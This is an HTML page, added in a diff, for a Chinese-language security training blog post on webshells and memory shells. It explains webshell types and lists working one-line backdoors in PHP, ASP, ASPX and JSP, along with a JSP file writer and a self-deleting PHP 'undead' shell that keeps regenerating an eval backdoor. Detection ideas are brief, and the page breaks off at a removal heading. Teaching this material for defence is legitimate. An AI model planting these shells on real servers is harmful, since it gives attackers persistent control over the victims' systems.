@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="day6-webshell详解一（上午：一句话、内存马）常见Webshell类型(一句话、冰蝎．哥斯拉、内存马等),上传方法和利用工具详解 webshell详解webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序. webshell是web的一个管理工具，可以对web服务器进行操作的权限。  webshell一般是被网站管理员用于网站管理、服务器管理等等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="day6-webshell详解一（上午：一句话、内存马）">
+<meta property="og:url" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="day6-webshell详解一（上午：一句话、内存马）常见Webshell类型(一句话、冰蝎．哥斯拉、内存马等),上传方法和利用工具详解 webshell详解webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序. webshell是web的一个管理工具，可以对web服务器进行操作的权限。  webshell一般是被网站管理员用于网站管理、服务器管理等等">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/_416gyL0T5Lzitj7S9RqNqp3w-NB1J0Re5zu-r2q6xg.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/VU2QhvQOTIIAyik7idTIyiHi99gDx9_a0MpRDEdo8c8.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/S6fOVzVdKGBe7GvpYwfiKLxvpciGWUB9SNycBy_qvKk.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/mMzXCiKQ-Jx99dr6p06Y3APTB_nMNhqPeH4fZrmtKQo.png">
+<meta property="article:published_time" content="2022-08-16T13:40:49.000Z">
+<meta property="article:modified_time" content="2023-05-29T13:19:28.949Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/_416gyL0T5Lzitj7S9RqNqp3w-NB1J0Re5zu-r2q6xg.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>day6-webshell详解一（上午：一句话、内存马）</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%BA%8C%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%AD%E9%97%B4%E4%BB%B6%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/08/16/day7-%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E6%8A%80%E6%9C%AF/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&text=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&is_video=false&description=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day6-webshell详解一（上午：一句话、内存马）&body=Check out this article: https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&name=day6-webshell详解一（上午：一句话、内存马）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&t=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day6-webshell详解一（上午：一句话、内存马）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">webshell详解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E7%A7%8D%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">webshell种类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">常见一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">1.3.1.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp"><span class="toc-number">1.3.2.</span> <span class="toc-text">asp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aspx"><span class="toc-number">1.3.3.</span> <span class="toc-text">aspx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp"><span class="toc-number">1.3.4.</span> <span class="toc-text">jsp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.4.</span> <span class="toc-text">WebShell管理工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.</span> <span class="toc-text">WebShell的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.</span> <span class="toc-text">内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.6.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98Webshell%E7%AE%80%E4%BB%8B"><span class="toc-number">1.6.2.</span> <span class="toc-text">内存Webshell简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98webshell%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.3.</span> <span class="toc-text">内存webshell原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.4.</span> <span class="toc-text">php内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.5.</span> <span class="toc-text">Java内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">filter型内存马原理</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        day6-webshell详解一（上午：一句话、内存马）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-16T13:40:49.000Z" class="dt-published" itemprop="datePublished">2022-08-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%9F%B9%E8%AE%AD%E8%AF%BE%E4%BB%B6/">原创培训课件</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="day6-webshell详解一（上午：一句话、内存马）"><a href="#day6-webshell详解一（上午：一句话、内存马）" class="headerlink" title="day6-webshell详解一（上午：一句话、内存马）"></a>day6-webshell详解一（上午：一句话、内存马）</h1><p>常见Webshell类型(一句话、冰蝎．哥斯拉、内存马等),上传方法和利用工具详解</p>
+<h2 id="webshell详解"><a href="#webshell详解" class="headerlink" title="webshell详解"></a>webshell详解</h2><p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序. webshell是web的一个管理工具，可以对web服务器进行操作的权限。 </p>
+<p>webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途， 但是由于webshell的功能比较强大，可以上传下载文件，查看数据库， 甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的）. 通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下， 然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>
+<p> 黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等 方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
+<p> 简单的说来，webshell就是一个asp、jsp或php木马后门，黑客在入侵了一个网站后， 常常在将这些 asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。 然后黑客就可以用web的方式，通过asp或php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p>
+<h2 id="webshell种类"><a href="#webshell种类" class="headerlink" title="webshell种类"></a>webshell种类</h2><p>webshell又称脚本木马，一般分为大马、小马、一句话木马。</p>
+<p>大马，体积大、功能齐全、能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。</p>
+<p>小马，一般而言，我们在上传文件的时候，会被限制上传的文件大小或是拦截的情况，那么我通过小马来上传大马，实现我们想要的功能。</p>
+<p>一句话木马，短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理webshell。</p>
+<h2 id="常见一句话木马"><a href="#常见一句话木马" class="headerlink" title="常见一句话木马"></a>常见一句话木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[value]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[value]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="function">eval <span class="title">request</span> (<span class="params"><span class="string">&quot;value&quot;</span></span>)%&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% execute(request(&quot;value&quot;)) %&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h3><figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; %&gt; &lt;% eval(Request.Item[&quot;value&quot;]) %&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;f&quot;</span>)!=<span class="literal">null</span>)(<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(application.getRealPath(<span class="string">&quot;\\&quot;</span>)+request.getParameter(<span class="string">&quot;f&quot;</span>))).write(request.getParameter(<span class="string">&quot;t&quot;</span>).getBytes());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="WebShell管理工具"><a href="#WebShell管理工具" class="headerlink" title="WebShell管理工具"></a>WebShell管理工具</h2><p>Cknife 中国菜刀</p>
+<p>antSword 中国蚁剑</p>
+<p>冰蝎 动态二进制加密网站管理客户端</p>
+<p>weevely3</p>
+<p>Altman</p>
+<p>Webshell Sniper</p>
+<p>Quasibot</p>
+<p>哥斯拉</p>
+<h2 id="WebShell的原理"><a href="#WebShell的原理" class="headerlink" title="WebShell的原理"></a>WebShell的原理</h2><p>在线php环境</p>
+<p><a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1/">https://c.runoob.com/compile/1/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[value]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$_POST</span>[value];  <span class="comment">//post传参给变量x</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$x</span>);   <span class="comment">//@可以阻止这些报错提示信息显示到界面上  eval是一个函数，把字符串当成 PHP 代码来计算</span></span><br><span class="line"> <span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//可以调用php的一些执行命令的函数去执行攻击者想要的操作</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);  <span class="comment">//system()函数将命令作为参数，并输出结果。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;uname -a&#x27;</span>);  <span class="comment">//system()函数将命令作为参数，并输出结果。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;uname -a&#x27;</span>);  <span class="comment">//system()函数将命令作为参数，并输出结果。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>PHP中一些执行shell命令最常用的函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()函数将命令作为参数，并输出结果。</span><br><span class="line"><span class="title function_ invoke__">exec</span>()功能是将命令作为参数，但不输出结果。</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()函数类似于<span class="title function_ invoke__">exec</span>()，但是，其整个输出结果为字符串。</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()执行一个命令并返回原始格式的输出。</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()函数可能很难理解。简单地说，我们可以使用<span class="title function_ invoke__">proc_open</span>()，创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1gbqITFThA1qJ-u7iyu2bQ">https://mp.weixin.qq.com/s/1gbqITFThA1qJ-u7iyu2bQ</a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经过近几年护网演练各种攻防对抗的开展，各个厂商对于传统的webshell文件都有很强的检测模型及检测技术，而内存马却不容易被检测到，本次小编整理了各类内存Webshell工具的使用方法和各类内存Webshell的识别方法。以便大家可以更加了解内存马的原理，而且如果真的不幸被植入内存马，也能更及时的解决。</p>
+<h3 id="内存Webshell简介"><a href="#内存Webshell简介" class="headerlink" title="内存Webshell简介"></a>内存Webshell简介</h3><p>内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>
+<h3 id="内存webshell原理"><a href="#内存webshell原理" class="headerlink" title="内存webshell原理"></a>内存webshell原理</h3><p>其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。</p>
+<p><img src="_416gyL0T5Lzitj7S9RqNqp3w-NB1J0Re5zu-r2q6xg.png" alt="image"></p>
+<h3 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h3><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。</p>
+<p><strong>检测思路：</strong></p>
+<ol>
+<li>检查所有php进程处理请求的持续时间</li>
+<li>检测执行文件是否在文件系统真实存在</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;zxc&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;bsm22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>函数说明</strong>：  </p>
+<ol>
+<li>ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</li>
+<li>set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。</li>
+<li>unlink(__FILE__)函数：删除文件。</li>
+<li>file_put_contents函数：将一个字符串写入文件。</li>
+<li>usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。</li>
+</ol>
+<p>实战</p>
+<p>1.将php不死马放到web目录下</p>
+<p>2.访问代码执行成功并生成后门</p>
+<p>3.执行完生成php一句话木马</p>
+<p>4.查看phpinfo</p>
+<p>5.对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。使用条件竞争写入同名文件进行克制不死马。</p>
+<p>删除：</p>
